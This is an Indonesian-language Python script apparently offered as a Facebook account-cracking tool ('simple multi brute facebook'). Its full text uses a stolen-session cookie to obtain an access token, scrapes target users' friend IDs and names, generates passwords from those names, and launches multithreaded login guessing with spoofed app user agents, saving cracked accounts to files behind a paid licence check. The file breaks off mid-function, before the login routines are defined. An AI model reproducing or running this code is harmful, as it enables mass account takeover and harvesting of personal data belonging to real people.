###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
###-----[ APPEN AND MORE ]-----###
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp=0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
rr = random.randint
rc = random.choice
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi ðŸ‘‹"
	elif 12 <= hours < 15:timenow = "Selamat Siang ðŸ‘‹"
	elif 15 <= hours < 18:timenow = "Selamat Sore ðŸ‘‹"
	else:timenow = "Selamat Malam ðŸ‘‹"
	return timenow
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
	print(f"""{P} \33[0;36m___  __  __  ____  ____ 
/ __)(  \/  )(  _ \( ___)
\__ \ )    (  ) _ < )__) 
(___/(_/\/\_)(____/(__)  
 [\33[0;34ssimple multi brute facebook{P}]\n [{M}Coded By SIDIK XD{P}]\n [{U}Est.2022{P}]{P}""")
 
 # ---- menu awal.
prints(panel(f"[bold white][+] - pembaruan login cookies. \n[+] - fix dump massal. \n[+] - pembaruan metode login.[/]",title=f"[bold green][ informasi ][/]",style=f"bold green",width=70));time.sleep(3)
###-----[ LOGIN COOKIES V1 ]-----###
def login():
	clear();banner()
	print(f"\n{P}  - masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f"  - untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f"  - cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n  - pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit("  - fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit("  - fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit("  - input hanya dengan angka,jangan kosong.")
	else:
		try:
			ses.headers.update({'Accept-Language': 'id,en;q=0.9', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Referer': 'https://www.instagram.com/', 'Host': 'www.facebook.com', 'Sec-Fetch-Mode': 'cors', 'Accept': '*/*', 'Connection': 'keep-alive', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Dest': 'empty', 'Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate'})
			response = ses.get("https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/yayanxd_/", cookies={"cookie":cok})
			if '"access_token":' in str(response.headers):
				token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
				open('.token.txt', 'a').write(token);open('.cok.txt', 'a').write(cok)
				exit(f"{P}  - token : {H}{token}{P} \n  - cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)

def lisensi():
	print("\nUntuk mendapatkan akses lisensi, silahkan kunjungi situs web ini: https://licensi.brutefb.my.id")
	key = input("\n> masukan lisensi: ")
	try:
		xnxx = request.urlopen(f"https://licensi.brutefb.my.id/api.php?key={key}&dev={platform()}")
		asuu = json.loads(xnxx.read())
		if "error" in asuu["status"]:
			print(asuu["msg"])
		else:
			print(f"\n> Selamat datang {asuu['nama']} di sc sidik xd")
			open(".lisen_fb.txt", "w").write(key)
			exit("> ketik python smbf.py untuk melanjutkan")
	except Exception as e:exit(e)

###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:xzx = open(".lisen_fb.txt", "r").read()
	except (FileNotFoundError):lisensi()
	try:
		xnxx = request.urlopen(f"https://licensi.brutefb.my.id/api.php?key={xzx}&dev={platform()}")
		asuu = json.loads(xnxx.read())
		todz = asuu["usage"];tod  = asuu["usage"].replace("premium", "Prem (yes premium)").replace("trial", "Trial (not premium)")
		notc = asuu["readtext"];bergabung = asuu["join"];kadaluarsa = asuu["expired"]
		if asuu["status"] == "error":
			print("");print(f"ðŸ˜” {asuu['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! Dikarenakan anda sudah login di device atau perangkat sebelumnya.')}");exit()
		elif asuu["status"] in ["kadaluarsa", "sudah kadaluarsa"]:
			print("");print("ðŸ˜” oppsh key anda telah mencapai batas masa aktif nya, silahkan upgrade ke premium.");time.sleep(5);lisensi()
	except KeyError:print("");print(f"ðŸ˜” {asuu['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! Dikarenakan anda sudah login di device atau perangkat sebelumnya.')}");exit()
	except UnboundLocalError:lisensi()
	except (json.decoder.JSONDecodeError, URLError):print("");print("ðŸ˜” gagal menghubungkan ke server, silahkan cek koneksi anda dan mainkan mode pesawat 5 detik.");exit()
	print(
		f"""

status : {tod}
sisa waktu: {notc}
bergabung: {bergabung}
kadaluarsa: {kadaluarsa}
""")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P}  - cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P}  - Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P}  - sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login()
	prints(f"\n[bold white]  - uid  facebook : {uidfb} \n  - nama facebook : {nama} \n  - metode login  : [bold green]validate facebook.com{P2}")
	print(f"\n{P}  - 1. crack id publik. \n  - 2. crack id publik massal ({H}disarankan{P}). \n  - 3. crack id dari file. {P} \n  - 4. dump id ke file. {P} \n  - 5. dump otomatis. \n  - 6. cek hasil crack. \n  - 0. keluar ({M}hapus cookies{P}).")
	menu = input(f'\n{P}  - pilih 1/6 : ')
	if menu in ["01","1"]:
		try:
			token = open('.token.txt','r').read()
			cok = open('.cok.txt','r').read()
		except IOError:
			exit()
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		user_dump = input(f'  - input id target : ')
		uid.append(user_dump)
		for userr in uid:
			try:
				col = ses.get(f"https://graph.facebook.com/{userr}", params={"access_token": token, "fields": "friends"}, cookies = {'cookies':cok}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"}).json()
				for x in col['friends']['data']:
					try:
						sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
						sys.stdout.flush()
						id.append(x['id']+'|'+x['name'])
					except:continue
			except (KeyError,IOError):
				pass
			except requests.exceptions.ConnectionError:
				print(f'  - koneksi buruk, silahkan refresh jaringan anda. ')
				exit()
		try:
			setting()
		except requests.exceptions.ConnectionError:
			print(f'\n  - koneksi buruk, silahkan refresh jaringan anda. ')
			exit()
	elif menu in ["02","2"]:
		Dump_Massal()
	elif menu in ["03","3"]:
		Crack_file()
	elif menu in ["04","4"]:
		Dump_id()
	elif menu in ["05","5"]:
		Dump_teman()
	elif menu in ["06","6"]:
		Result()
	elif menu in ['07','7']:
		random_email()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'\n  - Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f"\n  - input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()

def random_email():
	email = "@gmail.com"
	nama = input(f"\n  - input nama : ")
	jumlah = int(input(f"  - input limit : "))
	for z in range(jumlah):
		angka = str(rr(1,9999))
		id.append(nama+angka+email+"|"+nama)
		open('/sdcard/pelerr','a').write(nama+angka+email+"|"+nama+'\n')
		sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
		sys.stdout.flush()
	setting()
###-----[ DUMP OTOMATIS ]-----###
def Dump_teman():
	print()
	print(f'{P}  - Mode pesawat jika ingin stop Dump !!!{P}')
	user = input('  - Input target id : ')
	dumpx(user)
	setting2()
	for userr in id4:
		print(f'\n{P}  - sedang dump id : {userr}{P}')
		dumpy(userr)
	setting()

def dumpy(userr):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
                sys.stdout.flush()
                iso=(pi['id']+'|'+pi['name'])
                if "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                else:id.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        setting()
    except (KeyError,IOError):
        pass

def setting2():
	for bacot in id3:
		xx = random.randint(0,len(id4))
		id4.insert(xx,bacot)

def dumpx(user):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies={'cookie': cok},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                iso=(pi['id'])
                if "10009"  in iso:pass
                elif "79"  in iso:pass
                elif "78"  in iso:pass
                elif "77"  in iso:pass
                elif "76"  in iso:pass
                elif "75"  in iso:pass
                elif "74"  in iso:pass
                elif "73"  in iso:pass
                elif "72"  in iso:pass
                elif "71"  in iso:pass
                elif "70"  in iso:pass
                elif "19"  in iso:pass
                elif "18"  in iso:pass
                elif "17"  in iso:pass
                elif "16"  in iso:pass
                elif "15"  in iso:pass
                elif "14"  in iso:pass
                elif "13"  in iso:pass
                elif "12"  in iso:pass
                elif "11"  in iso:pass
                elif "110"  in iso:pass
                elif "109"  in iso:pass
                elif "108"  in iso:pass
                elif "107"  in iso:pass
                elif "106"  in iso:pass
                elif "105"  in iso:pass
                elif "104"  in iso:pass
                elif "103"  in iso:pass
                elif "102"  in iso:pass
                elif "101"  in iso:pass
                elif "10000009"  in iso:pass
                elif "10000008"  in iso:pass
                elif "10000007"  in iso:pass
                elif "10000006"  in iso:pass
                elif "10000005"  in iso:pass
                elif "10000004"  in iso:pass
                elif "10000003"  in iso:pass
                elif "10000002"  in iso:pass
                elif "10000001"  in iso:pass
                elif "10000000"  in iso:pass
                elif "1000009"  in iso:pass
                elif "1000008"  in iso:pass
                elif "1000007"  in iso:pass
                elif "1000006"  in iso:pass
                elif "1000005"  in iso:pass
                elif "1000004"  in iso:pass
                elif "1000003"  in iso:pass
                elif "1000002"  in iso:pass
                elif "1000001"  in iso:pass
                elif "1000000"  in iso:pass
                elif "100009"  in iso:pass
                elif "100008"  in iso:pass
                elif "100007"  in iso:pass
                elif "100006"  in iso:pass
                elif "100005"  in iso:pass
                elif "100004"  in iso:pass
                elif "100003"  in iso:pass
                elif "100002"  in iso:pass
                elif "100001"  in iso:pass
                elif "100000"  in iso:pass
                elif "10000"  in iso:pass
                else:id3.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        print('PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE')
        input('')
    except (KeyError,IOError):
        pass
###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P}  - 1. cek hasil akun {H}Live{P}. \n  - 2. cek hasil akun {K}Chek{P}. \n  - 3. kembali.")
	lihat_result = input(f'\n  - pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {K}Check {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {H}Live {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		jum = int(input(f'  - input jumlah target ? : '))
	except ValueError:
		print(f'  - input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'  - gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'  - input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}", params={"access_token": token, "fields": "friends"}, cookies = {'cookies':cok}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()
###-----[ DUMP FILE ]-----###
def Dump_id():
	file = input(f"\n  - masukan nama file dump anda : ")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P}  - pastikan id target tidak private/publik. {P}")
		jum = int(input(f'  - input jumlah target ? : '))
	except ValueError:
		print(f'  - input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'  - gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'  - input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
					open(file,'a').write(x['id']+'|'+x['name']+'\n')
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		exit(f"\n  - sukses dump file tersimpan pada : {file}")
	except KeyError:
		print(f"\n  - gagal dump, kemungkinan id tidak publik/cookies anda invalid")
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()
###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n  - masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r  - sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f"  - file tidak ada")
	setting()
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	print(f"\n{P}  - 1. urutan old ke new. \n  - 2. urutan new ke old. \n  - 3. urutan random. {P}")
	urutan_setting = input(f'\n  - pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}  - 1. metode API. \n  - 2. metode Async.{P} \n  - 3. metode Validate. {P} \n  - 4. metode Messenger. {P}")
	login_metode = input(f'\n  - pilih 1/3 : ')
	if login_metode in ["1","01"]:
		prints(f"\n[bold white]  - anda menggunakan metode api.")
		method.append('Api')
	elif login_metode in ["2","02"]:
		prints(f"\n[bold white]  - anda menggunakan metode async.")
		method.append('Async')
	elif login_metode in ["3","03"]:
		prints(f"\n[bold white]  - anda menggunakan metode validate.")
		method.append('Validate')
	elif login_metode in ["4","04"]:
		prints(f"\n[bold white]  - anda menggunakan metode messenger.")
		method.append('Messenger')
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}  - 1. password otomatis. \n  - 2. password gabung. \n  - 3. password manual. {P}")
	password_metode = input(f'\n  - pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
				else:
					if len(depan)<3:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
					else:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
				if 'Api' in method:
					MethodeCrack.submit(_api_,uid,pasw)
				elif 'Async' in method:
					MethodeCrack.submit(_async_,uid,pasw)
				elif 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				elif 'Messenger' in method:
					MethodeCrack.submit(_messenger_,uid,pasw)
				else:
					MethodeCrack.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	pw_manual=input(f'\n  - input password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
				else:
					if len(depan)<3:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
					else:
						pasw.append(nama)
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"09")
				for xpwd in pwnya:
					pasw.append(xpwd)
				if 'Api' in method:
					MethodeCrack.submit(_api_,uid,pasw)
				elif 'Async' in method:
					MethodeCrack.submit(_async_,uid,pasw)
				elif 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				elif 'Messenger' in method:
					MethodeCrack.submit(_messenger_,uid,pasw)
				else:
					MethodeCrack.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	print(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	pw_manual=input(f'\n  - input password manual : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'  - ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'  - input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}  - anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
  - {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
  - {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
  - mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			if 'Api' in method:
				MethodeCrack.submit(_api_,uid,pasw)
			elif 'Async' in method:
				MethodeCrack.submit(_async_,uid,pasw)
			elif 'Validate' in method:
				MethodeCrack.submit(_validate_,uid,pasw)
			elif 'Messenger' in method:
				MethodeCrack.submit(_messenger_,uid,pasw)
			else:
				MethodeCrack.submit(_messenger_,uid,pasw)
	print("\r")
	exit(f"{P}  - sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ USERAGENT MENU ]-----###
useragent = []
useragent2 = []
def palkon():
	rr = random.randint
	rc = random.choice
	androversi = rc(["10","11","12","13"])
	model = rc([
	"CPH1941 Build/RKQ1.200903.002",
	"CPH1951 Build/RP1A.200720.011",]) 
	versi_apk = f"{str(rr(350,450))}"
	versi_app1 = f"{str(rr(410000000,599999999))}"
	versi_app2 = f"{str(rr(410000000,599999999))}"
	messenger_app = rc([f"Dalvik/2.1.0 (Linux; U; Android {androversi}; {model}) [FBAN/Orca-Android;FBAV/{versi_apk}.1.0.35.116;FBPN/cofree.facebook.orca;FBLC/in_ID;FBBV/{versi_app1};FBCR/Telkomsel;FBMF/OPPO;FBBD/OPPO;FBDV/{model.split(' Build/')[0]};FBSV/{androversi};FBCA/arm64-v8a:null;FBDM/"+"{density="+str(rr(1,3))+"."+str(rc(["0","5"]))+",width=1080,height=1920};FB_FW/1;]"])
	facebook_app = rc([f"Dalvik/2.1.0 (Linux; U; Android {androversi}; {model}) [FBAN/FB4A;FBAV/{versi_apk}.0.0.33.118;FBPN/cofree.facebook.katana;FBLC/en_US;FBBV/{versi_app1};FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBDV/{model.split(' Build/')[0]};FBSV/{androversi};FBCA/arm64-v8a:null;FBDM/"+"{density="+str(rr(1,3))+"."+str(rc(["0","5"]))+",width=1080,height=1920};FB_FW/1;FBRV/0;]"])
	return rc([messenger_app,facebook_app])
def ua_valid():
	rr = random.randint
	rc = random.choice
	androversi = rc(["10","11","12","13","14"])
	chrome_version = f"{str(rr(30,110))}.0.{str(rr(1111,5999))}.{str(rr(45,150))}"
	apk = str(random.randint(300,450))+".1.0.36."+str(random.randint(90,150))
	app = random.randint(450000000,490000000)
	return f"Mozilla/5.0 (Linux; Android 8.1.0; Armor_3 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,110))}.0.{str(rr(1111,5999))}.{str(rr(45,150))} Mobile Safari/537.36 ACHEETAHI/1"
def ugen():
	rr = random.randint
	rc = random.choice
	androversi = rc(["10","11","12","13"])
	AA = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Safari/537.36 SLBrowser/8.0.1.4031 SLBChan/103"
